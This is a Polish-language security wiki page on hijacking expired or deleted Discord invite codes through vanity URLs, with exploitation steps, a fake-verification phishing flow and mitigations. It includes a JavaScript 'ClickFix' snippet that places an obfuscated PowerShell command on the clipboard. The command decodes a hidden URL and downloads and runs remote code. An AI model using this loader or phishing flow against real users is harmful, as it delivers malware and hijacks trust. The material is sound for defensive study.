# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Luka w systemie zaproszeń Discorda pozwala aktorom zagrożeń na przejęcie wygasłych lub usuniętych kodów zaproszeń (tymczasowych, stałych lub niestandardowych) jako nowych linków niestandardowych na każdym serwerze z poziomem 3. Normalizując wszystkie kody do małych liter, atakujący mogą wstępnie zarejestrować znane kody zaproszeń i cicho przejąć ruch, gdy oryginalny link wygaśnie lub źródłowy serwer straci swoje wzmocnienie.

## Typy zaproszeń i ryzyko przejęcia

| Typ zaproszenia       | Można przejąć? | Warunek / Uwagi                                                                                          |
|-----------------------|----------------|----------------------------------------------------------------------------------------------------------|
| Tymczasowy link zaproszenia | ✅          | Po wygaśnięciu kod staje się dostępny i może być ponownie zarejestrowany jako URL niestandardowy przez wzmocniony serwer. |
| Stały link zaproszenia | ⚠️          | Jeśli zostanie usunięty i składa się tylko z małych liter i cyfr, kod może stać się ponownie dostępny.   |
| Niestandardowy link niestandardowy | ✅          | Jeśli oryginalny serwer straci swoje wzmocnienie poziomu 3, jego zaproszenie niestandardowe staje się dostępne do nowej rejestracji. |

## Kroki eksploatacji

1. Rozpoznanie
- Monitoruj publiczne źródła (fora, media społecznościowe, kanały Telegram) w poszukiwaniu linków zaproszeń pasujących do wzoru `discord.gg/{code}` lub `discord.com/invite/{code}`.
- Zbieraj interesujące kody zaproszeń (tymczasowe lub niestandardowe).
2. Wstępna rejestracja
- Utwórz lub użyj istniejącego serwera Discord z uprawnieniami poziomu 3.
- W **Ustawienia serwera → URL niestandardowy**, spróbuj przypisać docelowy kod zaproszenia. Jeśli zostanie zaakceptowany, kod jest zarezerwowany przez złośliwy serwer.
3. Aktywacja przejęcia
- W przypadku tymczasowych zaproszeń, poczekaj, aż oryginalne zaproszenie wygaśnie (lub ręcznie je usuń, jeśli kontrolujesz źródło).
- W przypadku kodów zawierających wielkie litery, wersja małymi literami może być przejęta natychmiast, chociaż przekierowanie aktywuje się dopiero po wygaśnięciu.
4. Ciche przekierowanie
- Użytkownicy odwiedzający stary link są bezproblemowo kierowani do serwera kontrolowanego przez atakującego, gdy przejęcie jest aktywne.

## Przepływ phishingowy przez serwer Discord

1. Ogranicz kanały serwera, aby tylko kanał **#verify** był widoczny.
2. Wdróż bota (np. **Safeguard#0786**), aby zachęcał nowicjuszy do weryfikacji za pomocą OAuth2.
3. Bot przekierowuje użytkowników na stronę phishingową (np. `captchaguard.me`) pod pretekstem kroku CAPTCHA lub weryfikacji.
4. Wdróż sztuczkę UX **ClickFix**:
- Wyświetl komunikat o uszkodzonym CAPTCHA.
- Poprowadź użytkowników do otwarcia okna dialogowego **Win+R**, wklejenia wstępnie załadowanej komendy PowerShell i naciśnięcia Enter.

### Przykład wstrzyknięcia ClickFix do schowka
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
To podejście unika bezpośrednich pobrań plików i wykorzystuje znane elementy interfejsu użytkownika, aby zmniejszyć podejrzenia użytkowników.

## Mitigacje

- Używaj stałych linków zaproszeń zawierających przynajmniej jedną wielką literę lub znak niealfanumeryczny (nigdy nie wygasają, nie są wielokrotnego użytku).
- Regularnie zmieniaj kody zaproszeń i unieważniaj stare linki.
- Monitoruj status boosta serwera Discord i roszczenia dotyczące URL vanity.
- Edukuj użytkowników, aby weryfikowali autentyczność serwera i unikali wykonywania poleceń wklejonych ze schowka.

## Referencje

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
